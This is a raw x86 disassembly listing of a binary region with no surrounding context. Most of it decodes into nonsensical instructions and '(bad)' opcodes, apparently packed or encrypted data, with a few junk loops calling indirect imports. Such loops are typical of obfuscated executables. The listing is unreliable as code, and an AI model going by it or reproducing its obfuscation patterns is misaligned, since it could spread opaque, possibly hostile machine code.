  412907:	mov    cl,0xe0
  412909:	mov    esp,DWORD PTR [edx-0x17fda935]
  41290f:	mov    ebx,0x11e46c9b
  412914:	inc    edi
  412915:	push   ebp
  412916:	inc    edi
  412917:	fisub  WORD PTR [ebx+0x7b]
  41291a:	cmp    BYTE PTR [esp+ebx*4+0x702910c0],0x78
  412922:	call   0xf1bb:0x5ba6297d
  412929:	ins    BYTE PTR es:[edi],dx
  41292a:	jno    0x412964
  41292c:	sub    esp,DWORD PTR [ecx+0x56345272]
  412932:	sub    DWORD PTR [eax+0x56a2e464],edx
  412938:	loope  0x412997
  41293a:	lahf   
  41293b:	mov    BYTE PTR [ebp+0x2e7cac9],dl
  412941:	sahf   
  412942:	out    0x89,eax
  412944:	pop    ecx
  412945:	jmp    0x213c:0xb91dbf27
  41294c:	push   ss
  41294d:	test   DWORD PTR [eax+0xdc2730a],ecx
  412953:	int3   
  412954:	les    esi,FWORD PTR [ecx-0xd6f3a03]
  41295a:	mov    eax,ds:0x4e359a79
  412960:	cld    
  412961:	int    0x73
  412963:	imul   ecx,ebx,0xa03c6181
  412969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41296a:	add    eax,0xc3450f25
  41296f:	test   eax,0xf3130706
  412974:	jmp    0x41297e
  412976:	fwait
  412977:	xor    bh,ch
  412979:	in     eax,0xcd
  41297b:	add    esp,edx
  41297d:	mov    al,0xcc
  41297f:	pusha  
  412980:	(bad)  
  412982:	push   0x76
  412984:	cmp    ecx,edi
  412986:	push   esi
  412987:	jno    0x412996
  412989:	(bad)  
  41298a:	scas   al,BYTE PTR es:[edi]
  41298b:	das    
  41298c:	xor    al,0x67
  41298e:	inc    ebx
  41298f:	gs jns 0x4129b4
  412992:	mov    ch,0x57
  412994:	inc    ecx
  412995:	fstp   QWORD PTR [ecx+0x63]
  412998:	jo     0x4129b0
  41299a:	pop    ss
  41299b:	xchg   edx,eax
  41299c:	cwde   
  41299d:	cdq    
  41299e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41299f:	ret    0x9acc
  4129a2:	arpl   WORD PTR [edi+eiz*4-0x32f36b7c],di
  4129a9:	add    bl,ah
  4129ab:	push   ecx
  4129ac:	mov    esp,0x687f1f1b
  4129b1:	cmp    ebx,DWORD PTR [eax+0x3e]
  4129b4:	(bad)  
  4129b5:	pop    ebx
  4129b6:	xor    eax,0x2ea1f1e4
  4129bb:	jbe    0x41298a
  4129bd:	dec    edx
  4129be:	popa   
  4129bf:	xchg   BYTE PTR [ebp-0x39],bh
  4129c2:	inc    edi
  4129c3:	mov    dh,0xda
  4129c5:	mov    ?,WORD PTR [edx]
  4129c7:	fild   DWORD PTR [esi+0x3727f4c6]
  4129cd:	leave  
  4129ce:	xchg   ecx,ecx
  4129d0:	das    
  4129d1:	ror    BYTE PTR [ebx+0x4bebb36d],1
  4129d7:	push   edx
  4129d8:	out    dx,eax
  4129d9:	lods   eax,DWORD PTR ds:[esi]
  4129da:	push   es
  4129db:	gs scas eax,DWORD PTR es:[edi]
  4129dd:	bnd call 0x43555005
  4129e3:	js     0x41296c
  4129e5:	mov    ebx,0xb9523a75
  4129ea:	shl    ah,1
  4129ec:	mov    ds:0x94be607b,eax
  4129f1:	(bad)  [ecx+0x7c7c3301]
  4129f7:	int    0x98
  4129f9:	sbb    al,0x81
  4129fb:	jbe    0x412a4d
  4129fd:	or     eax,0x2fa1b7a
  412a02:	or     esi,DWORD PTR [ecx+ecx*4+0x6236e86b]
  412a09:	stos   DWORD PTR es:[edi],eax
  412a0a:	and    BYTE PTR [eax-0x44],cl
  412a0d:	es pop ss
  412a0f:	daa    
  412a10:	adc    al,0x64
  412a12:	iret   
  412a13:	dec    edi
  412a14:	sub    edi,eax
  412a16:	fadd   QWORD PTR ds:0xd26388b4
  412a1c:	sbb    al,0x82
  412a1e:	pop    ecx
  412a1f:	loope  0x4129f0
  412a21:	call   0x25afe363
  412a26:	jp     0x412aa5
  412a28:	repnz or BYTE PTR [ebp-0x22816d7f],cl
  412a2f:	and    cl,ch
  412a31:	push   eax
  412a32:	loop   0x412a8c
  412a34:	fist   DWORD PTR [eax]
  412a36:	mov    al,0xe2
  412a38:	ins    DWORD PTR es:[edi],dx
  412a39:	sub    eax,0x30af20c
  412a3e:	or     eax,esp
  412a40:	add    eax,0x9bc74407
  412a45:	repnz mov ah,0x5f
  412a48:	(bad)  
  412a49:	scas   eax,DWORD PTR es:[edi]
  412a4a:	pop    ecx
  412a4b:	pop    ebp
  412a4c:	and    al,0x50
  412a4e:	jge    0x412a5d
  412a50:	sub    eax,0xe8f19e4d
  412a55:	(bad)  
  412a56:	loop   0x412a98
  412a58:	jle    0x412a88
  412a5a:	inc    ebx
  412a5b:	test   BYTE PTR [edx+0x1c37a8ad],ch
  412a61:	in     al,0xd7
  412a63:	mov    dl,BYTE PTR [edx-0x4c]
  412a66:	dec    edx
  412a67:	or     dl,BYTE PTR [edi+0x1d]
  412a6a:	ficom  WORD PTR [ecx]
  412a6c:	retfw  
  412a6e:	(bad)  
  412a6f:	lods   al,BYTE PTR ds:[esi]
  412a70:	dec    edx
  412a71:	dec    esi
  412a72:	push   ebp
  412a73:	push   esp
  412a74:	fldenv [edx+0x31]
  412a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a78:	sbb    eax,0xbdf6abb3
  412a7d:	pop    ecx
  412a7e:	xlat   BYTE PTR ds:[ebx]
  412a7f:	mov    ebp,0xa140230a
  412a84:	xchg   esp,eax
  412a85:	and    BYTE PTR [eax],ah
  412a87:	(bad)  
  412a88:	xchg   esi,eax
  412a89:	cmp    esi,esi
  412a8b:	or     DWORD PTR [esi],esp
  412a8d:	xor    esp,DWORD PTR [esi+0x10840fdc]
  412a93:	add    BYTE PTR [eax],al
  412a95:	add    BYTE PTR [ebx+0x3d03144d],cl
  412a9b:	and    cl,ah
  412a9d:	inc    edx
  412a9e:	add    BYTE PTR [ebx-0x7609f4f7],cl
  412aa4:	dec    ebp
  412aa5:	in     al,0xc7
  412aa7:	add    eax,0x42fcf5
  412aac:	pop    ss
  412aad:	add    BYTE PTR [eax],al
  412aaf:	add    BYTE PTR [ebx+0x42fcf53d],al
  412ab5:	add    BYTE PTR [eax],al
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fcf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e317
  412af1:	mov    edi,DWORD PTR ds:0x42fcf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fcf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e128
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e118,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b9e
  412b3b:	adc    cl,ch
  412b3d:	daa    
  412b3e:	adc    DWORD PTR [esi+0x70],esp
  412b41:	jo     0x412afc
  412b43:	jle    0x412bb5
  412b45:	jo     0x412b14
  412b47:	sbb    BYTE PTR [ebp-0x57209d5b],dl
  412b4d:	mov    edi,0x9505c71c
  412b52:	inc    BYTE PTR [esi+0x108ea1aa]
  412b58:	loope  0x412afd
  412b5a:	dec    edx
  412b5b:	inc    ebx
  412b5c:	sbb    dl,dh
  412b5e:	(bad)  
  412b5f:	(bad)  
  412b60:	sti    
  412b61:	dec    edi
  412b62:	aas    
  412b63:	test   BYTE PTR [ebx-0x1e65ffa],ch
  412b69:	xchg   ebx,eax
  412b6a:	dec    edi
  412b6b:	and    DWORD PTR [ebp+0x13b980ce],0xffffffba
  412b72:	icebp  
  412b73:	dec    eax
  412b74:	jecxz  0x412bd9
  412b76:	push   ecx
  412b77:	scas   eax,DWORD PTR es:[edi]
  412b78:	push   ebp
  412b79:	outs   dx,BYTE PTR ds:[esi]
  412b7a:	and    esp,DWORD PTR [ebx+0x57]
  412b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b7e:	pop    esi
  412b7f:	in     eax,0xaa
  412b81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b82:	add    al,0xc8
  412b84:	inc    esp
  412b85:	(bad)
  412b88:	xchg   esp,eax
  412b89:	mov    bl,0x41
  412b8b:	ja     0x412b7a
  412b8d:	add    DWORD PTR [edi+ecx*4],esp
  412b90:	sahf   
  412b91:	inc    edi
  412b92:	xchg   ecx,eax
  412b93:	xlat   BYTE PTR ds:[ebx]
  412b94:	push   esi
  412b95:	jne    0x412b98
  412b97:	push   edi
  412b98:	(bad)  
  412b99:	cmp    al,0xcf
  412b9b:	cmp    eax,0xfd538180
  412ba0:	repz sbb al,0x18
  412ba3:	out    dx,eax
  412ba4:	inc    esp
  412ba5:	add    ebp,DWORD PTR [edi-0x79]
  412ba8:	js     0x412b5a
  412baa:	mov    bl,ch
  412bac:	test   eax,0x217da733
  412bb1:	retf   
  412bb2:	mov    eax,ds:0x28c40759
  412bb7:	mov    eax,ds:0x3a600a45
  412bbc:	mov    cr3,edx
  412bbf:	xor    DWORD PTR [ebx],eax
  412bc1:	test   eax,0xee8e4161
  412bc6:	push   ebx
  412bc7:	shl    BYTE PTR [eax-0x5c],cl
  412bca:	inc    ebx
  412bcb:	jo     0x412c02
  412bcd:	jnp    0x412b7e
  412bcf:	mov    DWORD PTR [ebx-0x7f],ebp
  412bd2:	cmc    
  412bd3:	int3   
  412bd4:	jae    0x412bd9
  412bd6:	mov    dl,0x58
  412bd8:	test   al,0x82
  412bda:	ficomp DWORD PTR [ebx]
  412bdc:	sbb    dh,BYTE PTR [esi]
  412bde:	sbb    cl,dh
  412be0:	scas   eax,DWORD PTR es:[edi]
  412be1:	sbb    eax,0xb1b3bc15
  412be6:	pop    ebx
  412be7:	in     eax,dx
  412be8:	gs push ebp
  412bea:	mov    ah,0xf3
  412bec:	test   DWORD PTR [edx+0x47],0xa892eb3c
  412bf3:	adc    ebp,ecx
  412bf5:	fistp  QWORD PTR [esi+0x1c]
  412bf8:	pop    edx
  412bf9:	ror    DWORD PTR [ecx+0x13c909d9],cl
  412bff:	leave  
  412c00:	leave  
  412c01:	fcos   
  412c03:	add    BYTE PTR [ecx+0x0],bl
  412c06:	or     ecx,DWORD PTR [ebp+0x79]
  412c09:	sbb    bl,BYTE PTR [ebp-0x6a]
  412c0c:	jge    0x412c54
  412c0e:	aad    0xcf
  412c10:	jns    0x412c8b
  412c12:	mov    ds:0x1f7c030b,al
  412c17:	gs mov dl,0x15
  412c1a:	(bad)  
  412c1b:	jg     0x412c8e
  412c1d:	cmc    
  412c1e:	jae    0x412c7e
  412c20:	aas    
  412c21:	pusha  
  412c22:	pusha  
  412c23:	popa   
  412c24:	lock mov edi,0x262b74d3
  412c2a:	jae    0x412bed
  412c2c:	shr    BYTE PTR [eax+0x1f],cl
  412c2f:	(bad)  [edx-0x454dc577]
  412c35:	xchg   eax,edi
  412c37:	sbb    eax,0x64f32afb
  412c3c:	xor    DWORD PTR [eax-0x5d],edi
  412c3f:	fisub  DWORD PTR [ebx+0x7f]
  412c42:	add    al,0xcf
  412c44:	ret    0x86a4
  412c47:	cmp    DWORD PTR [edx+0x29ae574e],0x66
  412c4e:	(bad)  
  412c4f:	test   DWORD PTR [eax-0x44],0x40e38dd7
  412c56:	inc    ebx
  412c57:	imul   BYTE PTR [ecx-0x9]
  412c5a:	fsubp  st(2),st
  412c5c:	dec    ebp
  412c5d:	adc    ch,BYTE PTR [eax-0x69]
  412c60:	in     eax,0x32
  412c62:	in     eax,dx
  412c63:	and    BYTE PTR [ebp+0x17],al
  412c66:	pusha  
  412c67:	lods   al,BYTE PTR ds:[esi]
  412c68:	mov    edi,0x550d46c8
  412c6d:	leave  
  412c6e:	adc    BYTE PTR ds:0xc6742971,al
  412c74:	inc    edx
  412c75:	int3   
  412c76:	ret    0xb6a0
  412c79:	sub    eax,0x79eb285c
  412c7e:	cmp    eax,0x45a33bc
  412c83:	dec    ecx
  412c84:	mov    esp,0x1c372f1f
  412c89:	push   eax
  412c8a:	sub    dl,BYTE PTR [eax+0x1935b908]
  412c90:	dec    esi
  412c91:	cmp    ah,BYTE PTR [edi]
  412c93:	outs   dx,DWORD PTR ds:[esi]
  412c94:	addr16 in eax,dx
  412c96:	add    eax,0xe8141c27
  412c9b:	call   0xe03c:0x87f94e32
  412ca2:	cmp    al,0x39
  412ca4:	jle    0x412d13
  412ca6:	inc    ebp
  412ca7:	cwde   
  412ca8:	cmp    BYTE PTR [ebp-0x7c8c7d6a],al
  412cae:	in     al,0xd3
  412cb0:	and    eax,0xb251009
  412cb5:	dec    ebx
  412cb6:	push   esp
  412cb7:	dec    ecx
  412cb8:	push   edi
  412cb9:	push   edx
  412cba:	call   0xe9c9:0xe76d8415
  412cc1:	les    esp,FWORD PTR [esi+0x5e]
  412cc4:	jge    0x412cc8
  412cc6:	dec    edi
  412cc7:	icebp  
  412cc8:	repz cwde 
  412cca:	jmp    DWORD PTR [ecx+0x3079adc9]
  412cd0:	xlat   BYTE PTR ds:[ebx]
  412cd1:	cmp    eax,DWORD PTR [ebp+esi*8-0x1d]
  412cd5:	dec    ebx
  412cd6:	cmp    dl,BYTE PTR ds:0xcc0522fa
  412cdc:	in     al,0x8b
  412cde:	push   ss
  412cdf:	push   ss
  412ce0:	add    DWORD PTR [ecx-0xf803eb0],eax
  412ce6:	pop    es
  412ce7:	pop    edx
  412ce8:	add    esp,DWORD PTR [eax]
  412cea:	cs mov ebp,0xb2f3aac4
  412cf0:	xchg   DWORD PTR [ebp-0x21],ebp
  412cf3:	aaa    
  412cf4:	or     eax,0xbb44ef7d
  412cf9:	mov    bl,0xd7
  412cfb:	sbb    esi,esi
  412cfd:	and    ecx,DWORD PTR [ecx-0x7d]
  412d00:	inc    esi
  412d01:	gs dec edx
  412d03:	sub    bh,BYTE PTR [esi]
  412d05:	xchg   DWORD PTR [edi+0x9],ebp
  412d08:	sbb    eax,ebp
  412d0a:	imul   ebx,DWORD PTR [ecx+0x23f30011],0x41
  412d11:	ins    BYTE PTR es:[edi],dx
  412d12:	pop    ds
  412d13:	or     ebp,DWORD PTR [esi-0x7265f2c8]
  412d19:	or     eax,0xaa99a022
  412d1e:	lods   eax,DWORD PTR ds:[esi]
  412d1f:	xchg   ebp,eax
  412d20:	into   
  412d21:	aad    0x9e
  412d23:	nop
  412d24:	dec    BYTE PTR [edx+edx*4+0x6]
  412d28:	jecxz  0x412cfb
  412d2a:	or     dh,BYTE PTR [ecx]
  412d2c:	ins    DWORD PTR es:[edi],dx
  412d2d:	sub    DWORD PTR [ebx-0x60],eax
  412d30:	cs pop esp
  412d32:	rol    edx,1
  412d34:	inc    eax
  412d35:	mov    al,ds:0x92474ca3
  412d3a:	sbb    bh,al
  412d3c:	fmul   DWORD PTR [edi+edi*4-0xb]
  412d40:	psubw  mm2,mm7
  412d43:	jmp    0x412cdd
  412d45:	xchg   BYTE PTR [eax-0x73b5908e],dl
  412d4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d4c:	cmp    BYTE PTR [ebx+0x72b6d950],dl
  412d52:	out    dx,al
  412d53:	dec    ecx
  412d54:	jp     0x412dc1
  412d56:	loop   0x412d76
  412d58:	push   ebp
  412d59:	add    eax,0x74f40381
  412d5e:	xchg   esp,eax
  412d5f:	rol    BYTE PTR ds:[edx-0x7dfe4004],0xd4
  412d67:	aam    0xe9
  412d69:	gs je  0x412d37
  412d6c:	xor    al,0xf9
  412d6e:	xor    bh,BYTE PTR [edx]
  412d70:	nop
  412d71:	repnz cmp eax,0x3d8ceb60
  412d77:	in     al,dx
  412d78:	test   al,0x1c
  412d7a:	mov    cl,0xb8
  412d7c:	fldenv [esi]
  412d7e:	arpl   WORD PTR [edx],cx
  412d80:	imul   ecx,DWORD PTR [ebp-0x26],0xab5f55f
  412d87:	inc    edx
  412d88:	add    eax,0x728bf736
  412d8d:	in     al,0x3d
  412d8f:	arpl   sp,sp
  412d91:	xchg   ecx,eax
  412d92:	dec    ecx
  412d93:	jb     0x412dae
  412d95:	loope  0x412db0
  412d97:	pop    esi
  412d98:	mov    cl,0xc5
  412d9a:	xor    al,BYTE PTR ds:0x1ef37084
  412da0:	add    edi,esp
  412da2:	jne    0x412dd8
  412da4:	fnstenv [esi+0x18c7720]
  412daa:	lahf   
  412dab:	xchg   BYTE PTR [ebx],dl
  412dad:	push   cs
  412dae:	inc    sp
  412db0:	cmc    
  412db1:	fnsave ds:0xc92dd7f7
  412db7:	rcl    DWORD PTR [edi-0x6d],cl
  412dba:	enter  0x2ca,0xfd
  412dbe:	mov    edi,0x34a55260
  412dc3:	xchg   BYTE PTR [ebx-0xd],dh
  412dc6:	or     ecx,ebp
  412dc8:	data16 mov al,ds:0x13fa7ac6
  412dce:	push   edx
  412dcf:	adc    eax,0xcf976b30
  412dd4:	and    DWORD PTR [ecx+edx*2],edx
  412dd7:	xchg   dx,ax
  412dd9:	push   eax
  412dda:	xor    DWORD PTR [edi-0x4162915],0x1b14a64
  412de4:	lods   eax,DWORD PTR ds:[esi]
  412de5:	aas    
  412de6:	dec    esi
  412de7:	dec    ebp
  412de8:	lods   al,BYTE PTR ds:[esi]
  412de9:	mov    ebp,eax
  412deb:	fdivr  st,st(4)
  412ded:	(bad)  
  412dee:	sub    edx,DWORD PTR [ebp+0x2b66e017]
  412df4:	mov    edx,0x1a9d8b59
  412df9:	push   esi
  412dfa:	add    DWORD PTR [esi+0x39],edx
  412dfd:	ss cwde 
  412dff:	push   ecx
  412e00:	mov    edx,edx
  412e02:	pop    ds
  412e03:	dec    esi
  412e04:	xchg   BYTE PTR [ebx-0xee1e512],cl
  412e0a:	pop    ds
  412e0b:	iret   
  412e0c:	pop    eax
  412e0d:	xchg   esi,ecx
  412e0f:	and    DWORD PTR ds:0x42e11c,0x0
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e11c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e11c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e11c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e11c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e487
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [edi+0x5ae90419],ax
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0x8770707e
  412e82:	mov    cl,0xf
  412e84:	add    eax,DWORD PTR ds:0x595b584b
  412e8a:	mov    ecx,0x83821f31
  412e8f:	push   cs
  412e90:	(bad)  
  412e91:	fisttp DWORD PTR [edi-0x6]
  412e94:	sahf   
  412e95:	mov    esp,0x2f3d45b9
  412e9a:	inc    esp
  412e9b:	sbb    al,0xec
  412e9d:	mov    esi,0x304d5c3c
  412ea2:	ja     0x412ee7
  412ea4:	ja     0x412e6e
  412ea6:	scas   eax,DWORD PTR es:[edi]
  412ea7:	mov    ebx,0xcd1d97b6
  412eac:	ror    DWORD PTR [ecx-0x5e],0x5a
  412eb0:	inc    esi
  412eb1:	mov    WORD PTR [edx],fs
  412eb3:	mov    ah,0xa7
  412eb5:	imul   eax,edx,0x658b86d0
  412ebb:	pop    eax
  412ebc:	xchg   ecx,eax
  412ebd:	ret    
  412ebe:	cdq    
  412ebf:	mov    cl,0x5b
  412ec1:	inc    edi
  412ec2:	mov    edi,0x506d5b15
  412ec7:	mov    eax,ds:0x341a3983
  412ecc:	out    dx,eax
  412ecd:	neg    BYTE PTR [ebp+0x78]
  412ed0:	call   0x73449b4e
  412ed5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ed6:	leave  
  412ed7:	(bad)
  412eda:	out    0x2c,eax
  412edc:	fld    TBYTE PTR [esi+0xa]
  412edf:	inc    eax
  412ee0:	mov    edi,0x334c27b4
  412ee5:	xchg   DWORD PTR [ebp+0x64],ecx
  412ee8:	out    dx,eax
  412ee9:	and    BYTE PTR [ebx-0xf],al
  412eec:	inc    ebp
  412eed:	lods   eax,DWORD PTR ds:[esi]
  412eee:	pushf  
  412eef:	stos   BYTE PTR es:[edi],al
  412ef0:	pop    esi
  412ef1:	mov    dh,0xa2
  412ef3:	jmp    0x56791175
  412ef8:	enter  0x742a,0xb9
  412efc:	dec    ecx
  412efd:	fidiv  WORD PTR ds:0x38f5ccca
  412f03:	jge    0x412f77
  412f05:	out    0xa6,eax
  412f07:	sahf   
  412f08:	xchg   edx,eax
  412f09:	pushf  
  412f0a:	push   esi
  412f0b:	stos   DWORD PTR es:[edi],eax
  412f0c:	gs adc ch,ah
  412f0f:	lds    ebp,FWORD PTR [esi+0x37]
  412f12:	inc    edx
  412f13:	adc    ah,BYTE PTR [eax+ebp*2]
  412f16:	(bad)  
  412f18:	test   eax,eax
  412f1a:	aam    0xc6
  412f1c:	int3   
  412f1d:	popa   
  412f1e:	aad    0x2e
  412f20:	pop    ss
  412f21:	scas   eax,DWORD PTR es:[edi]
  412f22:	jle    0x412ed8
  412f24:	mov    ds:0xaed3d2bc,al
  412f29:	pop    edx
  412f2a:	call   0xccba:0x7586b159
  412f31:	rol    BYTE PTR [edi+0x65],1
  412f34:	jecxz  0x412f57
  412f36:	test   DWORD PTR ds:0xbb82aa02,esp
  412f3c:	jne    0x412eec
  412f3e:	daa    
  412f3f:	adc    ebp,DWORD PTR [edx-0x756c86ca]
  412f45:	sbb    bl,BYTE PTR [edi]
  412f47:	xor    bh,BYTE PTR [ebx+0x78b4890d]
  412f4d:	jle    0x412f4c
  412f4f:	inc    ebx
  412f50:	xor    DWORD PTR [ebx+esi*8+0x7e],eax
  412f54:	or     al,0x71
  412f56:	add    dh,ch
  412f58:	mov    eax,0x72a53d1
  412f5d:	inc    BYTE PTR [esp+edi*2+0x68f1662a]
  412f64:	test   eax,0xdf382082
  412f69:	mov    eax,ds:0x2449cc98
  412f6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f6f:	pop    ebx
  412f70:	sbb    ebx,esp
  412f72:	pop    edi
  412f73:	rcl    BYTE PTR [ebp+0x18315878],cl
  412f79:	or     dl,BYTE PTR [ebx]
  412f7b:	xor    esp,ecx
  412f7d:	pop    esp
  412f7e:	cmp    eax,0x2f32f251
  412f83:	cwde   
  412f84:	in     eax,0xff
  412f86:	cmp    al,BYTE PTR [eax+ebp*4]
  412f89:	in     eax,dx
  412f8a:	add    eax,0x5cd34422
  412f8f:	clc    
  412f90:	fbstp  TBYTE PTR [ebx-0x264f6cc3]
  412f96:	mov    ebp,0x96a07b3
  412f9b:	xchg   ebx,eax
  412f9c:	jbe    0x412f35
  412f9e:	dec    esi
  412f9f:	fimul  DWORD PTR [ebx+0x47]
  412fa2:	mov    al,0x46
  412fa4:	scas   al,BYTE PTR es:[edi]
  412fa5:	jbe    0x412fd9
  412fa7:	aam    0x2f
  412fa9:	dec    ebp
  412faa:	les    edx,FWORD PTR [ecx-0x3140a6cd]
  412fb0:	cmp    BYTE PTR [esi+eiz*2],bl
  412fb3:	adc    cl,dh
  412fb5:	push   0xcdaa6cc
  412fba:	xor    eax,DWORD PTR [ecx-0x14]
  412fbd:	mov    dh,0xd1
  412fbf:	(bad)  
  412fc1:	in     eax,0x92
  412fc3:	dec    eax
  412fc4:	pusha  
  412fc5:	imul   ecx,DWORD PTR [bp+si+0x1e5e],0x6f207e96
  412fce:	inc    eax
  412fcf:	dec    DWORD PTR [esi]
  412fd1:	jle    0x413039
  412fd3:	pushf  
  412fd4:	dec    edi
  412fd5:	arpl   WORD PTR [ebx+0x39],dx
  412fd8:	xor    dh,BYTE PTR [ecx]
  412fda:	add    BYTE PTR [ecx+eax*8-0x72],0x3b
  412fdf:	jmp    0xe059cc9c
  412fe4:	cmp    DWORD PTR [ebp+ebx*1-0x1],0x76e3a8c8
  412fec:	fld    DWORD PTR [ecx]
  412fee:	gs pop edi
  412ff0:	cld    
  412ff1:	adc    eax,0x3b26cc43
  412ff6:	fst    QWORD PTR [eax]
  412ff8:	cdq    
  412ff9:	adc    al,0xa5
  412ffb:	adc    al,0xc6
  412ffd:	(bad)  
  412ffe:	jae    0x413015
  413000:	repnz mov ebx,0xd5aa71ff
  413006:	push   ds
  413007:	xor    BYTE PTR [ecx+eax*2+0x2a],dh
  41300b:	sar    BYTE PTR [edx+0x621beb42],0xf6
  413012:	and    BYTE PTR [ecx-0x5f47f965],0x30
  413019:	out    0xb9,al
  41301b:	cmc    
  41301c:	add    eax,0x802a758e
  413021:	xor    edx,0x6
  413024:	dec    edi
  413025:	test   DWORD PTR [ecx+0xbce5c1d],esp
  41302b:	dec    ecx
  41302c:	add    eax,0x9a63da70
  413031:	or     al,0xea
  413033:	rcr    DWORD PTR [ebx],cl
  413035:	inc    ebp
  413036:	mov    ds,WORD PTR [edx]
  413038:	pop    es
  413039:	xor    dh,BYTE PTR [ecx-0x50]
  41303c:	dec    ecx
  41303d:	jnp    0x41308b
  41303f:	jp     0x413006
  413041:	(bad)  
  413042:	in     eax,0x4a
  413044:	jmp    0x413079
  413046:	sub    BYTE PTR [ecx+0x259fc41a],al
  41304c:	fist   WORD PTR [edx+0x6c30e149]
  413052:	mov    ecx,0x8492ad74
  413057:	or     DWORD PTR [esi+0x41],ecx
  41305a:	retf   
  41305b:	pop    ebp
  41305c:	jl     0x4130cb
  41305e:	push   ebp
  41305f:	div    cl
  413061:	fwait
  413062:	mov    ds:0x5ef83800,eax
  413067:	pop    edx
  413068:	repz and BYTE PTR [edi-0x568b88c4],dh
  41306f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413070:	inc    esp
  413071:	sar    cl,cl
  413073:	leave  
  413074:	ret    
  413075:	arpl   WORD PTR [esi+ebx*1+0x7863f6c5],bp
  41307c:	fdivr  DWORD PTR [edi]
  41307e:	mov    ebx,0xabb0a886
  413083:	dec    ebp
  413084:	xchg   esi,eax
  413085:	cmp    DWORD PTR [esi+0x145b9b9f],esi
  41308b:	mov    dh,0x43
  41308d:	push   edx
  41308e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41308f:	mov    bh,BYTE PTR [esi]
  413091:	adc    BYTE PTR [edi+ecx*4],dh
  413094:	mov    ah,0x7e
  413096:	mov    al,0x23
  413098:	icebp  
  413099:	sub    BYTE PTR [eax],ah
  41309b:	in     al,0x29
  41309d:	push   esi
  41309e:	sbb    al,0xbf
  4130a0:	adc    DWORD PTR [edx+eiz*8-0x4f],edi
  4130a4:	jo     0x413083
  4130a6:	mov    BYTE PTR [esi+0x5afa9ec8],dh
  4130ac:	pop    eax
  4130ad:	or     ch,BYTE PTR [eax-0x23ff203b]
  4130b3:	mov    ebx,gs
  4130b5:	cmp    eax,0xe35daf77
  4130ba:	dec    edi
  4130bb:	jae    0x413053
  4130bd:	jp     0x41312a
  4130bf:	int    0x3e
  4130c1:	adc    eax,0xea177010
  4130c6:	stos   BYTE PTR es:[edi],al
  4130c7:	aam    0x24
  4130c9:	retf   0x3343
  4130cc:	mov    ebx,0x19394181
  4130d1:	loope  0x413064
  4130d3:	add    esp,ecx
  4130d5:	mov    al,0x32
  4130d7:	pop    ebx
  4130d8:	xor    bh,dh
  4130da:	mov    bh,0x3b
  4130dc:	add    BYTE PTR [edi],bh
  4130de:	pusha  
  4130df:	inc    ecx
  4130e0:	jmp    0x6820f34f
  4130e5:	ja     0x413092
  4130e7:	jmp    0xadaa:0x1df49dbc
  4130ee:	rcl    DWORD PTR [edi],0x97
  4130f1:	fwait
  4130f2:	fs repnz xchg esp,eax
  4130f5:	addr16 push ds
  4130f7:	cdq    
  4130f8:	cmpps  xmm6,xmm5,0x61
  4130fc:	jnp    0x413092
  4130fe:	ret    
  4130ff:	inc    eax
  413100:	in     eax,dx
  413101:	nop
  413102:	(bad)  
  413103:	outs   dx,BYTE PTR ds:[esi]
  413104:	outs   dx,DWORD PTR ds:[esi]
  413105:	inc    eax
  413106:	pop    edx
  413107:	jno    0x4130cf
  413109:	xor    DWORD PTR [eax],edi
  41310b:	mov    esi,0x67b9662
  413110:	div    DWORD PTR [esi+0x763df4b5]
  413116:	dec    esp
  413117:	push   ebx
  413118:	xor    eax,0xcfe990e2
  41311d:	sti    
  41311e:	outs   dx,BYTE PTR ds:[esi]
  41311f:	lahf   
  413120:	scas   al,BYTE PTR es:[edi]
  413121:	dec    ebp
  413122:	(bad)  
  413123:	jmp    0x413192
  413125:	pop    ebp
  413126:	fs sbb eax,0xa70e7004
  41312c:	sbb    DWORD PTR [ecx],ebx
  41312e:	push   esp
  41312f:	test   DWORD PTR [ebx+0x8],edx
  413132:	sbb    ch,BYTE PTR [esi]
  413134:	xchg   ebx,eax
  413135:	dec    ebp
  413136:	shl    DWORD PTR [ebx+eax*8],1
  413139:	test   esp,ebx
